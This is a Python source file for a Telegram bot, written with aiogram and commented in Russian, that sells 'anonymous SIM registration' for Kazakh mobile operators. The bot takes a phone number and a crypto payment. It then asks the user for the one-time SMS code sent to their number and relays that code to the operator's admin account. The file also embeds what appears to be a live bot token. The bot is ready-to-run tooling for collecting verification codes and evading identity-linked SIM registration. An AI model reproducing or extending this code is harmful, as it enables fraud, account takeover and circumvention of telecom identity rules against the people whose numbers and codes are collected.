import asyncio
import json
import logging
import re
import tempfile
from pathlib import Path
from typing import Dict, List, Any

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
TOKEN = "8623489996:AAE5rfYaS4JbAGrso_veeFALIsLagXx74s8"
ADMIN_ID = 8209617821
PRICE_USD = 2.5
# Твоя ссылка на оплату (чек или инвойс)
CRYPTOBOT_PAY_LINK = "https://t.me/CryptoBot?start=pay_YOUR_LINK"

DATA_FILE = Path("bot_data.json")
logging.basicConfig(level=logging.INFO)

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# Данные
pending_requests: List[Dict[str, Any]] = []
users: set[int] = set()
request_counter: int = 0

# ================= СОСТОЯНИЯ =================
class RegForm(StatesGroup):
    operator = State()
    phone = State()

# ================= JSON =================
async def load_data():
    global pending_requests, users, request_counter
    if DATA_FILE.exists():
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            pending_requests = data.get("pending_requests", [])
            users = set(data.get("users", []))
            request_counter = data.get("request_counter", 0)

async def save_data():
    data = {"pending_requests": pending_requests, "users": list(users), "request_counter": request_counter}
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

# ================= КЛАВИАТУРЫ =================
def get_main_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📞 Зарегистрировать SIM")],
        [KeyboardButton(text="💰 Цена"), KeyboardButton(text="🆘 Поддержка")]
    ], resize_keyboard=True)

def get_operators_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="Activ"), KeyboardButton(text="Tele2"), KeyboardButton(text="Altel")],
        [KeyboardButton(text="← Назад")]
    ], resize_keyboard=True)

# ================= ХЕНДЛЕРЫ КЛИЕНТА =================
@router.message(CommandStart())
async def cmd_start(message: Message):
    users.add(message.chat.id)
    await save_data()
    await message.answer("Анонимная регистрация SIM.\nБезопасно и быстро.", reply_markup=get_main_kb())

@router.message(F.text == "📞 Зарегистрировать SIM")
async def start_reg(message: Message, state: FSMContext):
    await message.answer("Выбери оператора:", reply_markup=get_operators_kb())
    await state.set_state(RegForm.operator)

@router.message(RegForm.operator, F.text.in_({"Activ", "Tele2", "Altel"}))
async def choose_op(message: Message, state: FSMContext):
    await state.update_data(operator=message.text)
    await message.answer(f"Оператор: {message.text}\nВведи номер (77xxxxxxxxx):")
    await state.set_state(RegForm.phone)

@router.message(RegForm.phone)
async def process_phone(message: Message, state: FSMContext):
    global request_counter
    phone = re.sub(r"\D", "", message.text)
    if len(phone) < 10: return await message.answer("Ошибка в номере.")
    
    data = await state.get_data()
    request_counter += 1
    rid = request_counter
    
    pending_requests.append({
        "id": rid, "user_id": message.chat.id, "phone": phone, 
        "operator": data['operator'], "status": "pending"
    })
    
    await message.answer(f"Заявка #{rid} принята. Ждите одобрения админом.", reply_markup=get_main_kb())
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="💰 Одобрить и ждать оплату", callback_data=f"approve_{rid}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"rej_{rid}")
    ]])
    await bot.send_message(ADMIN_ID, f"🆕 Заявка #{rid}\n📱 {phone}\n📶 {data['operator']}", reply_markup=kb)
    await state.clear()
    await save_data()

# ================= ХЕНДЛЕРЫ АДМИНА (ОПЛАТА И СМС) =================

@router.callback_query(F.data.startswith("approve_"))
async def admin_approve(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for req in pending_requests:
        if req["id"] == rid:
            req["status"] = "waiting_payment"
            # Просим клиента оплатить
            await bot.send_message(
                req["user_id"], 
                f"✅ Ваша заявка #{rid} одобрена!\n\n"
                f"Для продолжения оплатите **{PRICE_USD}$** через CryptoBot:\n"
                f"{CRYPTOBOT_PAY_LINK}\n\n"
                "После оплаты нажмите кнопку «Я оплатил» или просто ждите подтверждения.",
                parse_mode="Markdown"
            )
            
            # Кнопки для админа, чтобы подтвердить получение денег
            kb = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="💵 Деньги пришли (Запросить СМС)", callback_data=f"ask_sms_{rid}"),
                InlineKeyboardButton(text="❌ Отмена", callback_data=f"rej_{rid}")
            ]])
            await callback.message.edit_text(f"Заявка #{rid}: Ожидаем оплату от клиента.", reply_markup=kb)
            await save_data()
            break
    await callback.answer()

@router.callback_query(F.data.startswith("ask_sms_"))
async def admin_ask_sms(callback: CallbackQuery):
    rid = int(callback.data.split("_")[2])
    for req in pending_requests:
        if req["id"] == rid:
            req["status"] = "waiting_sms"
            await bot.send_message(req["user_id"], "💰 Оплата получена!\n\nТеперь введите **код из СМС**, который пришел на ваш номер:")
            await callback.message.edit_text(f"✅ Оплата подтверждена. Ждем СМС код от заявки #{rid}...")
            await save_data()
            break
    await callback.answer()

@router.callback_query(F.data.startswith("finish_"))
async def admin_finish(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for req in pending_requests:
        if req["id"] == rid:
            req["status"] = "completed"
            await bot.send_message(req["user_id"], f"🎉 Регистрация #{rid} успешно завершена! Спасибо за использование сервиса.")
            await callback.message.edit_text(f"🏁 Заявка #{rid} полностью готова.")
            await save_data()
            break
    await callback.answer()

@router.callback_query(F.data.startswith("rej_"))
async def admin_reject(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for req in pending_requests:
        if req["id"] == rid:
            req["status"] = "rejected"
            await bot.send_message(req["user_id"], "❌ К сожалению, ваша заявка отклонена.")
            await callback.message.edit_text(f"❌ Заявка #{rid} отклонена.")
            await save_data()
            break
    await callback.answer()

# ================= ПРИЕМ КОДА СМС =================
@router.message()
async def global_msg_handler(message: Message):
    if message.chat.id == ADMIN_ID: return

    # Ищем заявку, которая ждет СМС
    req = next((r for r in pending_requests if r["user_id"] == message.chat.id and r["status"] == "waiting_sms"), None)
    
    if req:
        code = message.text.strip()
        if code.isdigit():
            kb = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🏁 Завершить регистрацию", callback_data=f"finish_{req['id']}"),
                InlineKeyboardButton(text="❌ Ошибка кода", callback_data=f"ask_sms_{req['id']}")
            ]])
            await bot.send_message(ADMIN_ID, f"📩 **ПОЛУЧЕН КОД:** `{code}`\nЗаявка #{req['id']}\nНомер: {req['phone']}", reply_markup=kb, parse_mode="Markdown")
            await message.answer("Код передан админу. Ожидайте финала.")
        else:
            await message.answer("Введите только цифры из СМС.")
    else:
        # Просто пересылаем админу как поддержку
        await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)

async def main():
    await load_data()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
